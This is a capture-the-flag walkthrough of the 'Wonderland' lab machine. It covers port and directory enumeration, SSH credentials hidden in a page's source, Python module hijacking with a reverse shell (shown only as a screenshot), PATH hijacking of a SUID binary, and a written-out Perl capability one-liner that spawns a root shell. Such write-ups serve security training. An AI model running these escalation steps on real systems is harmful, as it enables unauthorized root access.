![3c4c56bf1f55e12125b714d67f603646.png](:/c77e531aac4442aabea53633bb41b850)
# Wonderland

## 1.Enumeration 

Let's start with a simple nmap scan:

``` 
nmap -sC -sV -p- 10.10.4.217     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 11:53 CEST
Nmap scan report for 10.10.4.217
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.75 seconds

```

We have opened ports like port 22 (ssh) and port 80 (http).

***
## 2. Exploring the website

If we take a look on the website we can see the following:

![df727043034910fa3ce8476781008dba.png](:/2a0796b35e3b42d58300452c1d688e77)

Let's run gobuster in order to enumerate hidden directories. This is what I found:

```
gobuster dir -u http://10.10.4.217 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.4.217
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/27 12:01:50 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
/r                    (Status: 301) [Size: 0] [--> r/]   
                                                         
===============================================================
2022/07/27 12:03:08 Finished
===============================================================
   
```

We have 3 directories "img", "poem" and "r". Of which, "poem" looks like a rabbit hole:

![cad70c3ed125d771739fcd525d3846ea.png](:/694ed3976819425382a3e1664d58f675)

In the other hand, if we have a look into the "r" directory, it seems like it invites us to keep enumerating:

![6b536586c575b835cb717e52b8093efe.png](:/566cbb1bb42d442fbe5286ec17109db7)

So I kept enumerating until i found this under "/r/a/b/b/i/t" directory:

![7006b717c87eecd353b6d843ee0e1aa0.png](:/5fbf552fc9124dadbc3f32ef9ac75124)

I took a moment to have a look the source code of that page and I found what it seemed like the ssh credentials for Alice!

![136668d0c8125f1f510e8556ab055ab4.png](:/81abc143fb6a4d34a1455120fcc69ebe)

***
## 3. Foot Hold

After finding the SSH credentials for Alice I decided to went right into the SSH server:

![860739501ddd60211a137f85aaee3c8c.png](:/28a7e8be891d4f388d9032265ee46a26)

This is actually funny, we can red the user flag inside the root's directory xD In this box, as the hint suggests, everything is upside down, meaning root.txt is in users’ home, and user.txt is in /root.

![7222d5d141c911696960874a72ae38b1.png](:/55b70dc766d444d78e359dc9905fd27e)

In Alice's home path I found the root flag (???) and a python script but, of course, I couldn't read the flag because I didn't have the rights as Alice:

![3a06a17c6eeb40448f187eff92468552.png](:/8fcfc70d5afa4f84be8f4f2fb18f739c)

So I focused into the python script. Basically, It has a large poem from which It pseudo-randomly takes 10 lines:

![ee75aa9918b8ddf9a4b32c4851552162.png](:/4b54e5f01b8945acb5854f01bfc74bd3)

Adittionaly, I saw that Alice could run this Python script with root privs:

![d690052a7962d54192fb0a50eebcc61b.png](:/ee8ce1c3bf5247a080b81189060093a8)

Python will look in the current working directory first for the module files before searching the specified Python library directories; so with that in mind, I created a file called random.py in the same directory. I used the IronHackers Python reverse shell:

![f97394d69d8675e39948f2e36916fc4b.png](:/6d0ab1c320394aaba33fafb6e4a123d2)

¡Important! Use the full path, otherwise it may throw an error about missing permissions.

![34db7ccb2c350cb8be421b877c3b5d07.png](:/791d2d0f24c3470c96b97911079a6c5d)

At this point I had managed to move laterally to another user:

![c6a87627f4f0643e274efc7b7efc2968.png](:/8b6d00e0eace46c4bf7bf753181b6120)

As always, upgrade the shell:

![20c9ed2f2cba748f05210d9c2dde268d.png](:/b8d0cb86d7af45b2b2a9abacffdfa12c)

The user directory has an executable file named teaParty owned by root with SUID permissions, so it’s definitely worth further investigation:

![dcadfb191a770d7f227e89577cd5ca1b.png](:/ef72134b3f4d424f9d7bf4a845c9a27d)

When I press the enter key, it immediately errors out with a “Segmentation fault” which sounds like an error with the memory:

![6485a3236092d323051d29d8c860022e.png](:/0a0a2471d26646a6b4584b96d19dcf00)

Using the strings command I found this interesting:

![2015f3fadad3fc8e24ba4e2f3a0dfb0d.png](:/b9ae44f7d8734139b329d26725162f89)

The key thing is that the date command is called with a specified path, that means that the shell will look through the $PATH variable for the file containing the data it wants to run. Knowing this, we can manipulate the path and have it point to our own crafted “date” command file instead of the original:

![63950f0511e845ffe1a6054aa7f049ac.png](:/1d858baf3496415eb21121e60f4972dd)

And we had managed to move laterally to "hatter"!!

On his working directory I found his password but unfortunately, he couldn't run sudo:

![2da93b9183a75be4bf17bf8ae1de1088.png](:/2b261c8db4f142e1a8352937f26b842c)

At this point, I set up a Python HTTP server on my machine and downloaded and ran Linpeas on our target machine:

![12119162c93646b94375aec0b0e9df8d.png](:/a27ab573f4be4552afc1c0ec1703b354)

Found exploitable Perl capabilities with LinPEAS:

![2397974232e99e78811355bd7d2c13de.png](:/cfa61ebf083d4d6ea0d763d87e52e976)

Since it’s a binary, let’s pull out our handy GTFObins page and give the provided commands a try:

![920c01ecf6525a2ebad87dc0b761894c.png](:/b9646477422841e9baa774ad79f21fb7)

```
hatter@wonderland:/$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# whoami
root
# cd /home/alice
# cat root.txt
thm{thefinalflag}
```

And we're done! Congratz!
